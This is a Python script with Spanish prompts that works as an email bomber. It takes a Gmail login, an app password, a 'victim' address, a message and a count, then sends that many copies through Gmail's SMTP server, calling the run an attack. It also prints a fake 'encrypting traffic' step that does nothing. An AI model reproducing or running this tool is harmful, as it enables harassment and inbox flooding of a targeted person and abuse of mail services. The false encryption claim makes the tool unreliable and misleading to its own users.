#Author: 0xJuaNc4

#Módulos
import os
import smtplib
from dotenv import load_dotenv
from time import sleep

#Paleta de colores
class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    PURPLE = "\033[35m"
    YELLOW = "\033[33m"
    RESET = "\033[0m"

#Banner
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{Colors.PURPLE}
    ╭━╮╭━╮╱╱╱╭╮╭━━╮╱╱╱╱╱╱╭╮
    ┃┃╰╯┃┃╱╱╱┃┃┃╭╮┃╱╱╱╱╱╱┃┃
    ┃╭╮╭╮┣━━┳┫┃┃╰╯╰┳━━┳╮╭┫╰━┳━━┳━╮
    ┃┃┃┃┃┃╭╮┣┫┃┃╭━╮┃╭╮┃╰╯┃╭╮┃┃━┫╭╯  {Colors.RESET}(Hecho por {Colors.YELLOW}0xJuaNc4{Colors.RESET}){Colors.PURPLE}
    ┃┃┃┃┃┃╭╮┃┃╰┫╰━╯┃╰╯┃┃┃┃╰╯┃┃━┫┃
    ╰╯╰╯╰┻╯╰┻┻━┻━━━┻━━┻┻┻┻━━┻━━┻╯
    {Colors.RESET}""")
    sleep(1)

#Email bomber
def send_email():
    num_counter = 0
    sender_email = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Introduce tu correo electrónico: "))
    sender_passwd = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Introduce la contraseña de aplicación: "))
    victim_email = str(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Introduce el correo electrónico víctima: "))
    message = input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Introduce el mensaje a enviar: ")
    try:
        counter = int(input(f"\n{Colors.YELLOW}[*]{Colors.RESET} Número de correos a enviar: "))
    except ValueError:
        print(f"\n{Colors.RED}[!]{Colors.RESET} Entrada no válida, prueba otra vez con un número")
        return
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Generando archivo {Colors.YELLOW}.env{Colors.RESET} con los datos introducidos")
    with open(".env", "w") as env_file:
        env_file.write(f"USER={sender_email}\n")
        env_file.write(f"PASS={sender_passwd}")
    sleep(2)
    print(f"\n{Colors.GREEN}[*]{Colors.RESET} Archivo {Colors.YELLOW}.env{Colors.RESET} creado con exito!")
    load_dotenv()
    sleep(2)
    banner()
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Resumen del ataque:")
    print(f"\n{Colors.PURPLE}Remitente:{Colors.RESET} {sender_email}\n{Colors.PURPLE}Destinatario:{Colors.RESET} {victim_email}\n{Colors.PURPLE}Número de correos:{Colors.RESET} {counter}")
    sleep(3)
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Encriptando el tráfico...")
    sleep(2)
    print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Iniciando el ataque...")
    sleep(2)
    banner()
    try:
        for i in range(counter):
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(os.getenv("USER"), os.getenv("PASS"))
            server.sendmail(os.getenv("USER"), victim_email, message)
            num_counter+=1
            print(f"\n{Colors.GREEN}[*]{Colors.RESET} Correo {num_counter} enviado!")
            if counter == num_counter:
                print(f"\n{Colors.YELLOW}[*]{Colors.RESET} {num_counter} correos enviados exitosamente a {Colors.PURPLE}{victim_email}{Colors.RESET}")
    except:
        print(f"\n{Colors.RED}[!]{Colors.RESET} La información introducida es incorrecta, no se puede llevar a cabo el ataque")
    
#Programa principal
if __name__ == "__main__":
    try:
        banner()
        send_email()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!]{Colors.RESET} Saliendo...")
    finally:
        try:
            os.remove(".env")
        except:
            pass
